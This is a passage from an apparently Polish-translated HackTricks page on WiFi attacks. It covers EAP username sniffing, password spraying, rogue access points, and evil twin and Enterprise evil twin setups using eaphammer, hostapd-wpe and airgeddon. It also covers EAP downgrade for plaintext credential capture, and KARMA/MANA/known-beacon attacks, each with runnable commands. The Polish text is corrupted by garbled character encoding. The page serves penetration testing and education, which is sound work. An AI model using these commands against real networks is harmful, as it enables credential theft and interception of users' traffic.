* **PEAP-EAP-TLS (lub PEAP-TLS)**: Podobne do EAP-TLS, ale inicjuje tunel TLS przed wymian certyfikat贸w, oferujc dodatkow warstw zabezpiecze.

Wicej informacji na temat tych metod uwierzytelniania mo偶na znale藕 [tutaj](https://en.wikipedia.org/wiki/Extensible\_Authentication\_Protocol) i [tutaj](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Przechwytywanie nazwy u偶ytkownika

Czytajc [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27), wyglda na to, 偶e jeli u偶ywasz **EAP**, **wiadomoci "Identity"** musz by **obsugiwane**, a **nazwa u偶ytkownika** zostanie wysana w **czystej postaci** w wiadomociach **"Response Identity"**.

Nawet przy u偶yciu jednej z najbardziej bezpiecznych metod uwierzytelniania: **PEAP-EAP-TLS**, mo偶liwe jest **przechwycenie nazwy u偶ytkownika wysanej w protokole EAP**. Aby to zrobi, **przechwy komunikacj uwierzytelniania** (uruchom `airodump-ng` na kanale i `wireshark` na tej samej karcie sieciowej) i filtrowa pakiety wedug `eapol`.\
Wewntrz pakietu "**Response, Identity**" pojawi si **nazwa u偶ytkownika** klienta.

![](<../../.gitbook/assets/image (150).png>)

### Anonimowe to偶samoci

Ukrywanie to偶samoci jest obsugiwane zar贸wno przez EAP-PEAP, jak i EAP-TTLS. W kontekcie sieci WiFi, 偶danie EAP-Identity jest zazwyczaj inicjowane przez punkt dostpu (AP) podczas procesu czenia. Aby zapewni ochron anonimowoci u偶ytkownika, odpowied藕 klienta EAP na urzdzeniu u偶ytkownika zawiera tylko niezbdne informacje wymagane do przetworzenia 偶dania przez pocztkowy serwer RADIUS. Ten koncept jest ilustrowany przez nastpujce scenariusze:

* EAP-Identity = anonymous

- W tym scenariuszu wszyscy u偶ytkownicy u偶ywaj pseudonimu "anonymous" jako identyfikatora u偶ytkownika. Pocztkowy serwer RADIUS dziaa jako serwer EAP-PEAP lub EAP-TTLS, odpowiedzialny za zarzdzanie stron serwerow protokou PEAP lub TTLS. Wewntrzna (chroniona) metoda uwierzytelniania jest nastpnie obsugiwana lokalnie lub przekazywana do zdalnego (domowego) serwera RADIUS.

* EAP-Identity = anonymous@realm_x

- W tej sytuacji u偶ytkownicy z r贸偶nych domen ukrywaj swoje to偶samoci, jednoczenie wskazujc swoje odpowiednie domeny. Pozwala to pocztkowemu serwerowi RADIUS na przekierowanie 偶da EAP-PEAP lub EAP-TTLS do serwer贸w RADIUS w ich domenach macierzystych, kt贸re dziaaj jako serwer PEAP lub TTLS. Pocztkowy serwer RADIUS dziaa wycznie jako wze przeka藕nika RADIUS.

- Alternatywnie, pocztkowy serwer RADIUS mo偶e dziaa jako serwer EAP-PEAP lub EAP-TTLS i obsugiwa metod uwierzytelniania lub przekazywa j do innego serwera. Ta opcja uatwia konfiguracj r贸偶nych polityk dla r贸偶nych domen.

W przypadku EAP-PEAP, po ustanowieniu tunelu TLS midzy serwerem PEAP a klientem PEAP, serwer PEAP inicjuje 偶danie EAP-Identity i przesya je przez tunel TLS. Klient odpowiada na to drugie 偶danie EAP-Identity, wysyajc odpowied藕 EAP-Identity zawierajc prawdziw to偶samo u偶ytkownika przez zaszyfrowany tunel. Ta metoda skutecznie zapobiega ujawnieniu rzeczywistej to偶samoci u偶ytkownika osobom podsuchujcym ruch 802.11.

EAP-TTLS stosuje nieco inny procedur. W przypadku EAP-TTLS klient zazwyczaj uwierzytelnia si za pomoc PAP lub CHAP, zabezpieczonych przez tunel TLS. W tym przypadku klient do wiadomoci TLS wysyanej po ustanowieniu tunelu dodaje atrybut User-Name oraz atrybut Password lub CHAP-Password.

Bez wzgldu na wybrany protok贸, serwer PEAP/TTLS uzyskuje wiedz o prawdziwej to偶samoci u偶ytkownika po ustanowieniu tunelu TLS. Prawdziwa to偶samo mo偶e by reprezentowana jako u偶ytkownik@domena lub po prostu u偶ytkownik. Jeli serwer PEAP/TTLS jest r贸wnie偶 odpowiedzialny za uwierzytelnianie u偶ytkownika, teraz posiada to偶samo u偶ytkownika i kontynuuje metod uwierzytelniania chronion przez tunel TLS. Alternatywnie, serwer PEAP/TTLS mo偶e przekaza nowe 偶danie RADIUS do domowego serwera RADIUS u偶ytkownika. Nowe 偶danie RADIUS pomija warstw protokou PEAP lub TTLS. W przypadkach, gdy chroniona metoda uwierzytelniania to EAP, wewntrzne wiadomoci EAP s przesyane do domowego serwera RADIUS bez opakowania EAP-PEAP lub EAP-TTLS. Atrybut User-Name wychodzcej wiadomoci RADIUS zawiera prawdziw to偶samo u偶ytkownika, zastpujc anonimowy atrybut User-Name z przychodzcego 偶dania RADIUS. Gdy chroniona metoda uwierzytelniania to PAP lub CHAP (obsugiwane tylko przez TTLS), atrybuty User-Name i inne atrybuty uwierzytelniania wyodrbnione z adunku TLS s zastpowane wychodzc wiadomoci RADIUS, zastpujc anonimowy atrybut User-Name i atrybuty TTLS EAP-Message znajdujce si w przychodzcym 偶daniu RADIUS.

Wicej informacji mo偶na znale藕 pod adresem [https://www.interlinknetworks.com/app\_notes/eap-peap.htm](https://www.interlinknetworks.com/app\_notes/eap-peap.htm)


### EAP-Bruteforce (password spray)

Jeli oczekuje si, 偶e klient bdzie u偶ywa **nazwy u偶ytkownika i hasa** (zauwa偶, 偶e **EAP-TLS nie bdzie w tym przypadku wa偶ne**), mo偶na spr贸bowa uzyska **list** **nazw u偶ytkownik贸w** (patrz nastpna cz) i **hasa** i spr贸bowa **przeama** dostp za pomoc [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Mo偶esz r贸wnie偶 przeprowadzi ten atak za pomoc `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Teoria atak贸w na klienta

### Wyb贸r sieci i roaming

- Protok贸 802.11 definiuje, jak stacja docza do rozszerzonego zestawu usug (ESS), ale nie okrela kryteri贸w wyboru ESS ani punktu dostpu (AP) w nim.
- Stacje mog przechodzi midzy AP o tej samej ESSID, utrzymujc czno w budynku lub obszarze.
- Protok贸 wymaga uwierzytelnienia stacji do ESS, ale nie nakada obowizku uwierzytelnienia AP do stacji.

### Listy preferowanych sieci (PNL)

- Stacje przechowuj ESSID ka偶dej sieci bezprzewodowej, do kt贸rej si podczaj, w swojej licie preferowanych sieci (PNL), wraz z konfiguracj specyficzn dla sieci.
- PNL jest u偶ywana do automatycznego czenia si z znanymi sieciami, poprawiajc dowiadczenie u偶ytkownika poprzez usprawnienie procesu czenia.

### Pasywne skanowanie

- AP okresowo wysya ramki beacon, ogaszajc swoj obecno i funkcje, w tym ESSID AP, chyba 偶e nadawanie jest wyczone.
- Podczas pasywnego skanowania stacje nasuchuj ramek beacon. Jeli ESSID beakonu pasuje do wpisu w PNL stacji, stacja mo偶e automatycznie poczy si z tym AP.
- Wiedza na temat PNL urzdzenia umo偶liwia potencjalne wykorzystanie poprzez naladowanie ESSID znanej sieci, wprowadzajc urzdzenie w bd i zmuszajc je do poczenia z faszywym AP.

### Aktywne sondowanie

- Aktywne sondowanie polega na wysyaniu przez stacje 偶da sondy w celu odkrycia pobliskich AP i ich charakterystyk.
- Skierowane 偶dania sondy s kierowane do okrelonego ESSID, co pomaga wykry, czy okrelona sie jest w zasigu, nawet jeli jest ukryta.
- Szeroko rozsyane 偶dania sondy maj pole SSID o wartoci null i s wysyane do wszystkich pobliskich AP, pozwalajc stacji sprawdzi, czy istnieje preferowana sie, nie ujawniajc zawartoci PNL.

## Prosty AP z przekierowaniem do Internetu

Przed wyjanieniem, jak przeprowadza bardziej zo偶one ataki, zostanie wyjanione, **jak** po prostu **utworzy** AP i **przekierowa** jego **ruch** do interfejsu podczonego **do** **Internetu**.

Za pomoc polecenia `ifconfig -a` sprawd藕, czy interfejs wlan do utworzenia AP i interfejs podczony do Internetu s obecne.

### DHCP i DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Utw贸rz plik konfiguracyjny `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Nastpnie **ustaw adresy IP** i **trasy**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
A nastpnie **uruchom** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd

hostapd jest programem, kt贸ry umo偶liwia uruchomienie punktu dostpowego Wi-Fi na karcie sieciowej. Mo偶e by u偶ywany do przeprowadzania test贸w penetracyjnych na sieciach Wi-Fi. hostapd obsuguje r贸偶ne tryby dziaania, takie jak tryb AP (Access Point), tryb WDS (Wireless Distribution System) i tryb mesh (sie siatkowa). Mo偶e by r贸wnie偶 skonfigurowany do obsugi r贸偶nych zabezpiecze, takich jak WPA (Wi-Fi Protected Access) i WPA2 (Wi-Fi Protected Access 2). hostapd jest narzdziem przydatnym podczas testowania bezpieczestwa sieci Wi-Fi i identyfikowania potencjalnych luk w zabezpieczeniach.
```bash
apt-get install hostapd
```
Utw贸rz plik konfiguracyjny `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Zatrzymaj uci偶liwe procesy**, ustaw **tryb monitorowania** i **uruchom hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Przekierowywanie i przekierowanie

Forwarding and redirection are techniques used in networking to redirect traffic from one location to another. These techniques are commonly used in the context of pentesting WiFi networks to redirect traffic to an attacker-controlled device.

#### Forwarding

Forwarding involves redirecting network traffic from one interface to another. This can be useful in scenarios where you want to intercept and analyze network traffic flowing through a specific interface. By enabling forwarding, you can redirect traffic to your attacker machine and capture packets for further analysis.

To enable forwarding on a Linux machine, you can use the following command:

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

#### Redirection

Redirection, on the other hand, involves redirecting traffic from one IP address to another. This technique is commonly used in phishing attacks, where an attacker redirects traffic from a legitimate website to a malicious one.

To perform IP redirection, you can use tools like `iptables` on Linux. Here's an example command to redirect traffic from one IP address to another:

```bash
iptables -t nat -A PREROUTING -d <original_ip> -j DNAT --to-destination <new_ip>
```

Remember to replace `<original_ip>` with the original IP address and `<new_ip>` with the IP address you want to redirect the traffic to.

By understanding and utilizing forwarding and redirection techniques, you can gain more control over network traffic and redirect it to your advantage during a pentesting engagement.
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Atak evil twin wykorzystuje spos贸b, w jaki klienci WiFi rozpoznaj sieci, opierajc si g贸wnie na nazwie sieci (ESSID), bez koniecznoci uwierzytelniania punktu dostpu (access point) przez klienta. Kluczowe punkty to:

- **Trudnoci w rozr贸偶nieniu**: Urzdzenia maj trudnoci w rozr贸偶nieniu midzy prawdziwymi a faszywymi punktami dostpu, gdy maj tak sam nazw ESSID i ten sam rodzaj szyfrowania. W rzeczywistych sieciach czsto u偶ywa si wielu punkt贸w dostpu o tej samej nazwie ESSID, aby bezproblemowo rozszerzy zasig.

- **Roaming klienta i manipulacja poczeniem**: Protok贸 802.11 umo偶liwia urzdzeniom przechodzenie midzy punktami dostpu w tej samej ESSID. Atakujcy mog wykorzysta to, przycigajc urzdzenie do rozczenia si z obecnym punktem dostpu i poczenia si z faszywym. Mo偶na to osign, oferujc silniejszy sygna lub zak贸cajc poczenie z prawdziwym punktem dostpu za pomoc pakiet贸w deautentykacyjnych lub zak贸ce.

- **Wyzwania w wykonaniu**: Skuteczne przeprowadzenie ataku evil twin w rodowiskach z wieloma dobrze rozmieszczonymi punktami dostpu mo偶e by trudne. Wyczenie jednego prawdziwego punktu dostpu czsto skutkuje poczeniem urzdzenia z innym prawdziwym punktem dostpu, chyba 偶e atakujcy mo偶e wyczy wszystkie pobliskie punkty dostpu lub strategicznie umieci faszywy punkt dostpu.

Mo偶esz stworzy bardzo podstawowy Open Evil Twin (bez mo偶liwoci przekierowania ruchu do Internetu), wykonujc:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Mo偶esz r贸wnie偶 utworzy Zy Bli藕niak u偶ywajc **eaphammer** (zauwa偶, 偶e aby utworzy ze bli藕niaki za pomoc eaphammer, interfejs **NIE POWINIEN** by w trybie **monitorowania**):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Lub u偶ywajc Airgeddon: `Opcje: 5,6,7,8,9 (w menu ataku Evil Twin).`

![](<../../.gitbook/assets/image (148).png>)

Nale偶y zauwa偶y, 偶e domylnie, jeli ESSID w PNL jest zapisany jako chroniony przez WPA, urzdzenie nie bdzie automatycznie czy si z otwartym Evil Twinem. Mo偶esz spr贸bowa przeprowadzi atak DoS na prawdziwy AP i mie nadziej, 偶e u偶ytkownik poczy si rcznie z twoim otwartym Evil Twinem, lub mo偶esz przeprowadzi atak DoS na prawdziwy AP i u偶y WPA Evil Twin, aby przechwyci handshake (korzystajc z tej metody nie bdziesz w stanie poczy si z ofiar, poniewa偶 nie znasz PSK, ale mo偶esz przechwyci handshake i spr贸bowa go zama).

_Niekt贸re systemy operacyjne i programy antywirusowe ostrzegaj u偶ytkownika, 偶e poczenie z otwart sieci jest niebezpieczne..._

### WPA/WPA2 Evil Twin

Mo偶esz stworzy **Evil Twin u偶ywajc WPA/2**, a jeli urzdzenia s skonfigurowane do czenia si z tym SSID za pomoc WPA/2, bd pr贸bowa si poczy. W ka偶dym razie, **aby ukoczy 4-etapowy handshake**, musisz r贸wnie偶 **zna** **haso**, kt贸re klient zamierza u偶y. Jeli go **nie znasz**, **poczenie nie zostanie ukoczone**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Aby zrozumie te ataki, zalecam przeczytanie kr贸tkiego wyjanienia [WPA Enterprise](./#wpa-enterprise-mgt).

**U偶ywanie hostapd-wpe**

`hostapd-wpe` wymaga pliku **konfiguracyjnego**, aby dziaa. Aby **zautomatyzowa** generowanie tych konfiguracji, mo偶na u偶y [https://github.com/WJDigby/apd\_launchpad](https://github.com/WJDigby/apd\_launchpad) (pobierz plik pythonowy do folderu _/etc/hostapd-wpe/_).
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
W pliku konfiguracyjnym mo偶na wybra wiele r贸偶nych rzeczy, takich jak ssid, kana, pliki u偶ytkownika, certyfikat/klucz, parametry dh, wersja wpa i autoryzacja...

[**U偶ywanie hostapd-wpe z EAP-TLS, aby umo偶liwi logowanie dowolnym certyfikatem.**](evil-twin-eap-tls.md)

**U偶ywanie EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Domylnie EAPHammer oferuje nastpujce metody uwierzytelniania (zauwa偶, 偶e GTC jest pierwsz metod, kt贸ra pr贸buje uzyska hasa w postaci zwykego tekstu, a nastpnie u偶ywane s bardziej niezawodne metody uwierzytelniania):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
To jest domylna metodyka, aby unikn dugiego czasu poczenia. Jednak mo偶na r贸wnie偶 okreli serwerowi metody uwierzytelniania od najmniej do najbardziej bezpiecznych:
```
--negotiate weakest
```
Mo偶esz r贸wnie偶 u偶y:

* `--negotiate gtc-downgrade` do u偶ycia bardzo wydajnej implementacji GTC downgrade (hasa w postaci tekstu)
* `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` do rcznego okrelenia oferowanych metod (oferowanie tych samych metod uwierzytelniania w tej samej kolejnoci co organizacja utrudni wykrycie ataku).
* [Znajd藕 wicej informacji w wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**U偶ywanie Airgeddon**

`Airgeddon` mo偶e u偶ywa wczeniej wygenerowanych certyfikat贸w do oferowania uwierzytelniania EAP w sieciach WPA/WPA2-Enterprise. Faszywa sie zdegradowa bdzie protok贸 poczenia do EAP-MD5, dziki czemu bdzie w stanie **przechwyci u偶ytkownika i MD5 hasa**. P贸藕niej atakujcy mo偶e spr贸bowa zama haso.\
`Airggedon` daje mo偶liwo **cigego ataku Evil Twin (gony)** lub **tylko tworzenia ataku Evil Twin do momentu poczenia si kogo (gadki).**

![](<../../.gitbook/assets/image (129).png>)

### Debugowanie tuneli TLS PEAP i EAP-TTLS w atakach Evil Twin

_Metoda ta zostaa przetestowana w poczeniu PEAP, ale poniewa偶 deszyfrowuj dowolny tunel TLS, powinna dziaa r贸wnie偶 z EAP-TTLS_

W **konfiguracji** _hostapd-wpe_ **zakomentuj** lini zawierajc _**dh\_file**_ (od `dh_file=/etc/hostapd-wpe/certs/dh` do `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Spowoduje to, 偶e `hostapd-wpe` bdzie **wymienia klucze za pomoc RSA**, a nie DH, dziki czemu bdziesz m贸g **odszyfrowa** ruch p贸藕niej, **znajc prywatny klucz serwera**.

Teraz uruchom **Evil Twin** u偶ywajc **`hostapd-wpe`** z t zmodyfikowan konfiguracj jak zwykle. Uruchom r贸wnie偶 **`wireshark`** na **interfejsie**, na kt贸rym przeprowadzany jest atak Evil Twin.

Teraz lub p贸藕niej (gdy ju偶 przechwycisz pewne pr贸by uwierzytelnienia) mo偶esz doda prywatny klucz RSA do wiresharka w: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Dodaj nowy wpis i wypenij formularz tymi wartociami: **Adres IP = dowolny** -- **Port = 0** -- **Protok贸 = dane** -- **Plik klucza** (**wybierz sw贸j plik klucza**, aby unikn problem贸w wybierz plik klucza **bez hasa**).

![](<../../.gitbook/assets/image (151).png>)

I sp贸jrz na now zakadk **"Decrypted TLS"**:

![](<../../.gitbook/assets/image (152).png>)

## Atak KARMA, MANA, Loud MANA i znane beacons

### Czarne/biae listy ESSID i MAC

R贸偶ne typy list filtr贸w dostpu do kontroli dostpu do sieci (MFACL) i odpowiadajce im tryby i efekty zachowania rogue Access Point (AP):

1. **Biaa lista oparta na MAC**:
- Rogue AP bdzie odpowiada tylko na 偶dania sondy od urzdze wymienionych na licie biaej, pozostajc niewidocznym dla wszystkich innych nieuwzgldnionych.

2. **Czarna lista oparta na MAC**:
- Rogue AP bdzie ignorowa 偶dania sondy od urzdze na czarnej licie, co skutecznie sprawia, 偶e rogue AP jest niewidoczny dla tych konkretnych urzdze.

3. **Biaa lista oparta na ESSID**:
- Rogue AP bdzie odpowiada tylko na 偶dania sondy dla okrelonych ESSID, co sprawia, 偶e jest niewidoczny dla urzdze, kt贸rych lista preferowanych sieci (PNL) nie zawiera tych ESSID.

4. **Czarna lista oparta na ESSID**:
- Rogue AP nie bdzie odpowiada na 偶dania sondy dla okrelonych ESSID znajdujcych si na czarnej licie, co sprawia, 偶e jest niewidoczny dla urzdze poszukujcych tych konkretnych sieci.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Ta metoda umo偶liwia **atakujcemu stworzenie zoliwego punktu dostpu (AP), kt贸ry odpowiada na wszystkie 偶dania sondy** pochodzce od urzdze poszukujcych sieci do poczenia. Ta technika **oszukuje urzdzenia, aby poczyy si z AP atakujcego**, naladujc sieci, kt贸rych urzdzenia poszukuj. Gdy urzdzenie wysya 偶danie poczenia do tego faszywego AP, poczenie zostaje ukoczone, prowadzc do bdnego poczenia urzdzenia z sieci atakujcego.

### MANA

Nastpnie **urzdzenia zaczy ignorowa niechciane odpowiedzi sieciowe**, co zmniejszyo skuteczno pierwotnego ataku karma. Jednak wprowadzono now metod, znan jako **atak MANA**, opracowan przez Iana de Villiersa i Dominica White'a. Ta metoda polega na tym, 偶e zoliwy AP **przechwytuje listy preferowanych sieci (PNL) z urzdze, odpowiadajc na ich rozgoszeniowe 偶dania sondy** nazwami sieci (SSID), wczeniej wywoanymi przez urzdzenia. Ten zaawansowany atak omija zabezpieczenia przed pierwotnym atakiem karma, wykorzystujc spos贸b, w jaki urzdzenia zapamituj i priorytetyzuj znane sieci.

Atak MANA dziaa poprzez monitorowanie zar贸wno skierowanych, jak i rozgoszeniowych 偶da sondy od urzdze. Dla 偶da skierowanych, rejestruje adres MAC urzdzenia i 偶dan nazw sieci, dodajc te informacje do listy. Gdy otrzymuje 偶danie rozgoszeniowe, AP odpowiada informacjami pasujcymi do dowolnej sieci znajdujcej si na licie urzdzenia, zachcajc urzdzenie do poczenia si z zoliwym AP.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Gony atak MANA

**Gony atak MANA** to zaawansowana strategia stosowana w przypadku, gdy urzdzenia nie korzystaj z kierowanego sondowania lub gdy nieznane s atakujcemu listy preferowanych sieci (PNL). Dziaa na zasadzie, 偶e **urzdzenia w tej samej okolicy prawdopodobnie bd miay pewne nazwy sieci wsp贸lne w swoich listach PNL**. Zamiast selektywnie odpowiada, ten atak rozsya odpowiedzi na sondowanie dla ka偶dej nazwy sieci (ESSID) znalezionej w poczonych listach PNL wszystkich obserwowanych urzdze. Taka szeroka metoda zwiksza szans, 偶e urzdzenie rozpozna znajom sie i spr贸buje poczy si z faszywym punktem dostpu (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Znany atak Beacon

Kiedy atak **Loud MANA** mo偶e nie wystarczy, **znany atak Beacon** prezentuje inn metod. Ta metoda **siowo pr贸buje nawiza poczenie, symulujc punkt dostpowy (AP), kt贸ry odpowiada na dowoln nazw sieci, przechodzc przez list potencjalnych ESSID** pochodzcych z listy s贸w. Symuluje to obecno licznych sieci, majc nadziej na dopasowanie ESSID w PNL ofiary, co skoni do pr贸by poczenia z sfaszowanym AP. Atak mo偶na wzmocni, czc go z opcj `--loud`, aby bardziej agresywnie zwabi urzdzenia.

Eaphammer zaimplementowa ten atak jako atak MANA, w kt贸rym wszystkie ESSID z listy s adowane (mo偶na to r贸wnie偶 poczy z `--loud`, aby stworzy atak Loud MANA + Znane beacons):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Atak znanego wybuchu sygna贸w Beacon**

Atak **znanego wybuchu sygna贸w Beacon** polega na **szybkim nadawaniu ramek Beacon dla ka偶dego ESSID wymienionego w pliku**. Tworzy to gste rodowisko faszywych sieci, znacznie zwikszajc prawdopodobiestwo, 偶e urzdzenia pocz si z podstpnie dziaajcym punktem dostpowym, zwaszcza gdy jest to poczone z atakiem MANA. Ta technika wykorzystuje prdko i ilo, aby przytoczy mechanizmy wyboru sieci urzdze.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** to protok贸 umo偶liwiajcy urzdzeniom bezporednie poczenie ze sob za pomoc Wi-Fi, bez koniecznoci tradycyjnego punktu dostpowego. Ta funkcjonalno jest zintegrowana w r贸偶ne urzdzenia Internetu Rzeczy (IoT), takie jak drukarki i telewizory, uatwiajc bezporedni komunikacj midzy urzdzeniami. Istotn cech Wi-Fi Direct jest to, 偶e jedno urzdzenie peni rol punktu dostpowego, znanego jako waciciel grupy, kt贸ry zarzdza poczeniem.

Bezpieczestwo pocze Wi-Fi Direct jest ustanawiane za pomoc **Wi-Fi Protected Setup (WPS)**, kt贸ry obsuguje kilka metod bezpiecznego parowania, w tym:
- **Konfiguracja za pomoc przycisku (PBC)**
- **Wprowadzanie PIN-u**
- **Komunikacja w polu bliskiego zasigu (NFC)**

Te metody, zwaszcza wprowadzanie PIN-u, s podatne na te same podatnoci co WPS w tradycyjnych sieciach Wi-Fi, co czyni je celem podobnych wektor贸w ataku.

### EvilDirect Hijacking

**EvilDirect Hijacking** to atak specyficzny dla Wi-Fi Direct. Odzwierciedla on koncepcj ataku Evil Twin, ale skierowany jest na poczenia Wi-Fi Direct. W tej sytuacji atakujcy podszywa si pod prawowitego waciciela grupy w celu wprowadzenia urzdze w bd i poczenia z zoliwym podmiotem. Ten spos贸b mo偶na wykona za pomoc narzdzi takich jak `airbase-ng`, podajc kana, ESSID i adres MAC podszywanego urzdzenia:

## Referencje

* [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
* [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
* [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
* [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
* [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
* [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\))
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)

TODO: Sprawd藕 [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (logowanie za pomoc Facebooka i imitacja WPA w portalach przechwytywania)

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Docz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowa si z dowiadczonymi hakerami i owcami bd贸w!

**Wnioski z Hackingu**\
Zajmuj si treciami, kt贸re zagbiaj si w emocje i wyzwania zwizane z hakerstwem

**Aktualne wiadomoci o hakerstwie na 偶ywo**\
Bd藕 na bie偶co z szybkim tempem wiata hakerstwa dziki aktualnym wiadomociom i wnioskom

**Najnowsze ogoszenia**\
Bd藕 na bie偶co z najnowszymi programami bug bounty i wa偶nymi aktualizacjami platformy

**Docz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij wsp贸pracowa z najlepszymi hakerami ju偶 dzi!

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy **reklam swojej firmy w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
